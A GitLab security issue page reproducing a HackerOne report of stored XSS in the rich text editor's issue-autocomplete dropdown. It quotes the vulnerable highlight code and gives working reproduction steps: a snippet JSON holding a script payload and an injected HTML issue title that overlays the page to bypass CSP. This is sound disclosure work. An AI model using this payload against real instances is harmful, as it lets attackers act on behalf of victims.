

[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# Stored XSS via autocomplete results in rich text editor

âš  **Please read [the process](https://gitlab.com/gitlab-org/release/docs/-/blob/master/general/security/developer.md) on how to fix security issues before starting to work on the issue. Vulnerabilities must be fixed in a security mirror.**

**[HackerOne report #2404710](https://hackerone.com/reports/2404710)** by `yvvdwf` on 2024-03-06, assigned to [@cmaxim](/cmaxim "Costel Maxim"):

[Report](#report) | [Attachments](#attachments) | [How To Reproduce](#how-to-reproduce)

## Report

Hello,

Recently Gitlab improved autocomplete results in rich text editor:

```
//https://gitlab.com/gitlab-org/gitlab/-/blob/3617b242c79d080dc3757c2defb5574170566051/app/assets/javascripts/content_editor/components/suggestions_dropdown.vue#L236-244
  highlight(text) {
      return this.query
        ? String(text).replace(
            new RegExp(this.query, 'i'),
            (match) => `<strong class="gl-text-body!">${match}</strong>`,
          )
        : text;
    },
```

Although the results are then rendered via `v-safe-html` but attacker can inject some DOM attributes, such as, `class` attribute that can be exploited to execute arbitrary javascript at the client side.

### Reproduction

#### As attacker:

1. create a public snippet with a json file `alert.json` containing `{"html":"<script>alert(document.domain)</script>"}`, then open the raw version and make note of the path, for example: `https://gitlab.com/-/snippets/3683972/raw/main/alert.json`

[![snippet.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/89d5a60e60c7bbcddc1af3e2cd6804ed90ce863d/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f35613761653763632d623438632d343032332d386663632d3362633533326563623831302f736e69707065742e706e67)

2. create a new project and add a new issue within the following title:

```
test issue <i class=inline-parallel-buttons><a href=/-/snippets/3683972/raw/main/alert style="position:fixed;transform:translate3d(-2000px,-5000px,0px);width:10000px;height:20000px">
```

*Note*: replace the url in `href` by the path to your json file noted above with the following modification:

* no `https://gitlab.com` prefix
* no `.json` suffix

[![issue.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/c942804997fc914f5047dffd39cd0a09deb7729f/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f34653661393837362d633765302d343562642d626530382d3137633339346134643264652f69737375652e706e67)

#### As victim:

go in the project, modify a file, then create a new merge request:

[![merge-request.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/41db53110fcc30fc3a016eb666d8ea6e191af541/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f63336233373766652d663434632d343966392d623562382d6139323130303963316336662f6d657267652d726571756573742e706e67)

1. click `Changes` to open a diff view
2. click `Switch to rich text editing` if you are in `plain text editing` mode
3. in `Description`, enter `#` character to get suggestion results of the project's issue. Once the suggestion list appears, you might notice a transparent layer on the topmost. Click anywhere to trigger XSS.

#### Note:

`PR:L` as attackers need only permission to create a public snippet and an issue inside victim's project. An issue can be also created via `Service Desk` which is enabled by default for any project. If so, attacks can even create an issue on a private project.

### Impact:

XSS with CSP bypassed allows attackers to perform arbitrary actions on behalf of victims

Best,

yvvdwf

#### Impact

XSS with CSP bypassed allows attackers to perform arbitrary actions on behalf of victims

## Attachments

**Warning:** Attachments received through HackerOne, please exercise caution!

* [merge-request.png](https://h1.sec.gitlab.net/a/c3b377fe-f44c-49f9-b5b8-a921009c1c6f/merge-request.png)
* [issue.png](https://h1.sec.gitlab.net/a/4e6a9876-c7e0-45bd-be08-17c394a4d2de/issue.png)
* [snippet.png](https://h1.sec.gitlab.net/a/5a7ae7cc-b48c-4023-8fcc-3bc532ecb810/snippet.png)

## How To Reproduce

Please add [reproducibility information](https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues) to this section:

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.

